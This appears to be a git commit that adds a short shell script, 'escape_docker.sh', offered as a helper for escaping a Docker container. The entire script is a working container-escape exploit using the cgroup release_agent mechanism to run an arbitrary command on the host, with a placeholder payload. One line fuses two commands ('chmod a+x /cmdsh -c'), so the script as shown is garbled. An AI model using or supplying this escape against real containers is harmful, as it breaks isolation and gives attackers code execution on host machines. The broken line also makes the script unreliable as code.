584f9d3fd14fe205a7b7ee651e143a7f5daec285
braunbearded <braunbearded1@gmail.com>
2022-10-01 13:11:12 +0200

    add docker container escape helper

---
+++ helper/escape_docker.sh
@@ -0,0 +1,10 @@
+#!/bin/sh
+
+mkdir /tmp/cgrp && mount -t cgroup -o rdma cgroup /tmp/cgrp && mkdir /tmp/cgrp/x
+echo 1 > /tmp/cgrp/x/notify_on_release
+host_path=`sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab`
+echo "$host_path/cmd" > /tmp/cgrp/release_agent
+echo '#!/bin/sh' > /cmd
+echo "some command > $host_path/output" >> /cmd
+chmod a+x /cmdsh -c "echo \$\$ > /tmp/cgrp/x/cgroup.procs"
+sh -c "echo \$\$ > /tmp/cgrp/x/cgroup.procs"
